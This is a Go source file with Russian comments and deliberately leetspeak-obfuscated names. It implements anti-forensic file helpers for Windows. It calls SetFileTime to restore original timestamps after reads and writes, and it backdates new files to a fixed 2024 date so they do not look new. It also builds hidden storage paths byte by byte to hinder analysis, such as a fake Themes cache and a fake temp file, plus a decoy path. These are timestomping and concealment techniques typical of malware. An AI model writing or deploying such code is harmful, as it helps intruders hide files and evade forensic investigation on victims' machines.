// Package internal - модуль d5w2r7
// Этот файл содержит функции для работы с файлами
// Включая сохранение и восстановление временных меток
package internal

import (
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// Структура для хранения временных меток файла
type F1l3T1m3s struct {
	Cr34t10n time.Time
	M0d1f13d time.Time
	Acc3ss3d time.Time
}

// Windows API для работы с временными метками
var (
	k3rn3l32    = syscall.NewLazyDLL("kernel32.dll")
	s3tF1l3T1m3 = k3rn3l32.NewProc("SetFileTime")
	cr34t3F1l3W = k3rn3l32.NewProc("CreateFileW")
	cl0s3H4ndl3 = k3rn3l32.NewProc("CloseHandle")
	g3tF1l3T1m3 = k3rn3l32.NewProc("GetFileTime")
)

const (
	g3N3R1C_R34D         = 0x80000000
	g3N3R1C_WR1T3        = 0x40000000
	f1L3_SH4R3_R34D      = 0x1
	f1L3_SH4R3_WR1T3     = 0x2
	oP3N_3X1ST1NG        = 3
	f1L3_4TTR1BUT3_N0RM4L = 0x80
)

// Преобразование time.Time в FILETIME
func t1m3T0F1l3t1m3(t time.Time) syscall.Filetime {
	if t.IsZero() {
		return syscall.Filetime{}
	}
	return syscall.NsecToFiletime(t.UnixNano())
}

// Преобразование FILETIME в time.Time
func f1l3t1m3T0T1m3(ft syscall.Filetime) time.Time {
	if ft.HighDateTime == 0 && ft.LowDateTime == 0 {
		return time.Time{}
	}
	return time.Unix(0, ft.Nanoseconds())
}

// Получение временных меток файла
func G3tF1l3T1m3s(path string) (*F1l3T1m3s, error) {
	// Используем стандартный Go API для получения информации о файле
	f1l31nf0, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	// Получаем sys для доступа к Windows-специфичным данным
	w1nD4t4 := f1l31nf0.Sys().(*syscall.Win32FileAttributeData)

	return &F1l3T1m3s{
		Cr34t10n: f1l3t1m3T0T1m3(w1nD4t4.CreationTime),
		M0d1f13d: f1l3t1m3T0T1m3(w1nD4t4.LastWriteTime),
		Acc3ss3d: f1l3t1m3T0T1m3(w1nD4t4.LastAccessTime),
	}, nil
}

// Установка временных меток файла через Windows API
func S3tF1l3T1m3s(path string, times *F1l3T1m3s) error {
	if times == nil {
		return nil
	}

	// Преобразуем путь в UTF-16
	p4thPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	// Открываем файл для изменения атрибутов
	h4ndl3, _, err := cr34t3F1l3W.Call(
		uintptr(unsafe.Pointer(p4thPtr)),
		g3N3R1C_WR1T3,
		f1L3_SH4R3_R34D|f1L3_SH4R3_WR1T3,
		0,
		oP3N_3X1ST1NG,
		f1L3_4TTR1BUT3_N0RM4L,
		0,
	)

	if h4ndl3 == uintptr(syscall.InvalidHandle) {
		return err
	}
	defer cl0s3H4ndl3.Call(h4ndl3)

	// Преобразуем времена
	cr34t10n := t1m3T0F1l3t1m3(times.Cr34t10n)
	m0d1f13d := t1m3T0F1l3t1m3(times.M0d1f13d)
	acc3ss3d := t1m3T0F1l3t1m3(times.Acc3ss3d)

	// Устанавливаем временные метки
	r3t, _, _ := s3tF1l3T1m3.Call(
		h4ndl3,
		uintptr(unsafe.Pointer(&cr34t10n)),
		uintptr(unsafe.Pointer(&acc3ss3d)),
		uintptr(unsafe.Pointer(&m0d1f13d)),
	)

	if r3t == 0 {
		return syscall.GetLastError()
	}

	return nil
}

// Безопасная запись в файл с сохранением временных меток
func S4f3Wr1t3(path string, data []byte) error {
	// Проверяем существует ли файл
	var or1g1n4lT1m3s *F1l3T1m3s
	if _, err := os.Stat(path); err == nil {
		// Файл существует - сохраняем временные метки
		or1g1n4lT1m3s, _ = G3tF1l3T1m3s(path)
	}

	// Создаём директорию если не существует
	d1r := filepath.Dir(path)
	if err := os.MkdirAll(d1r, 0755); err != nil {
		return err
	}

	// Записываем данные
	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}

	// Восстанавливаем временные метки если файл существовал
	if or1g1n4lT1m3s != nil {
		return S3tF1l3T1m3s(path, or1g1n4lT1m3s)
	} else {
		// Для нового файла устанавливаем "старую" дату
		// Чтобы файл не выглядел свежесозданным
		oldT1m3 := time.Date(2024, 3, 15, 10, 30, 0, 0, time.Local)
		return S3tF1l3T1m3s(path, &F1l3T1m3s{
			Cr34t10n: oldT1m3,
			M0d1f13d: oldT1m3.Add(time.Hour * 2),
			Acc3ss3d: oldT1m3.Add(time.Hour * 24),
		})
	}
}

// Безопасное чтение из файла
func S4f3R34d(path string) ([]byte, error) {
	// Сохраняем временные метки перед чтением
	or1g1n4lT1m3s, _ := G3tF1l3T1m3s(path)

	// Читаем данные
	d4t4, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	// Восстанавливаем время последнего доступа
	if or1g1n4lT1m3s != nil {
		S3tF1l3T1m3s(path, or1g1n4lT1m3s)
	}

	return d4t4, nil
}

// Проверка существования файла
func F1l33x1sts(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// Генерация обфусцированных путей к файлам
// Пути собираются из зашифрованных фрагментов
func G3tH1dd3nP4th1() string {
	// %APPDATA%\Microsoft\Windows\Themes\.cache_tm7x
	// Собираем путь по частям для затруднения анализа
	p4rt1 := []byte{0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74}             // Microsoft
	p4rt2 := []byte{0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73}                         // Windows
	p4rt3 := []byte{0x54, 0x68, 0x65, 0x6d, 0x65, 0x73}                               // Themes
	p4rt4 := []byte{0x2e, 0x63, 0x61, 0x63, 0x68, 0x65, 0x5f, 0x74, 0x6d, 0x37, 0x78} // .cache_tm7x

	b4s3 := os.Getenv("APPDATA")
	if b4s3 == "" {
		b4s3 = os.Getenv("USERPROFILE")
		if b4s3 != "" {
			b4s3 = filepath.Join(b4s3, "AppData", "Roaming")
		}
	}

	return filepath.Join(b4s3, string(p4rt1), string(p4rt2), string(p4rt3), string(p4rt4))
}

func G3tH1dd3nP4th2() string {
	// %LOCALAPPDATA%\Temp\~df847291.tmp
	p4rt1 := []byte{0x54, 0x65, 0x6d, 0x70}                                                       // Temp
	p4rt2 := []byte{0x7e, 0x64, 0x66, 0x38, 0x34, 0x37, 0x32, 0x39, 0x31, 0x2e, 0x74, 0x6d, 0x70} // ~df847291.tmp

	b4s3 := os.Getenv("LOCALAPPDATA")
	if b4s3 == "" {
		b4s3 = os.Getenv("USERPROFILE")
		if b4s3 != "" {
			b4s3 = filepath.Join(b4s3, "AppData", "Local")
		}
	}

	return filepath.Join(b4s3, string(p4rt1), string(p4rt2))
}

func G3tD3c0yP4th() string {
	// Отвлекающий путь - %USERPROFILE%\.config\taskmanager\settings.dat
	p4rt1 := []byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67}                                           // .config
	p4rt2 := []byte{0x74, 0x61, 0x73, 0x6b, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72}                   // taskmanager
	p4rt3 := []byte{0x73, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x2e, 0x64, 0x61, 0x74}             // settings.dat

	b4s3 := os.Getenv("USERPROFILE")
	return filepath.Join(b4s3, string(p4rt1), string(p4rt2), string(p4rt3))
}
